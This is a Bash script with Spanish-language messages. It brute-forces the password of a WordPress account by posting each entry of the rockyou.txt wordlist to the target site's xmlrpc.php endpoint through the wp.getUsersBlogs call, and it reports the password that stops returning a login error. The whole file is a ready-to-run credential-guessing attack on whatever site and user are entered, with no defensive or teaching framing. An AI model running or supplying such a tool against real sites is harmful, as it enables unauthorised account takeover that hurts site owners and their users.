#!/bin/bash

function ctrl_c() {
  echo -e "\n\n[!] Saliendo..."
  exit 1
}

echo -e "Link: " && read link
echo -e "User: " && read user

trap ctrl_c INT

function createXML() {
  password=$1
  payload="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>$user</value></param>
<param><value>$password</value></param>
</params>
</methodCall>
"""

  echo $payload > file.xml
  response=$(curl -s -X POST "${link}/xmlrpc.php" -d@file.xml)
  if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
    echo "[+] Contraseña para $user -> $password"
    exit 0
  fi
sleep 5
}

cat /usr/share/wordlists/rockyou.txt | while read password; do
  createXML $password
done
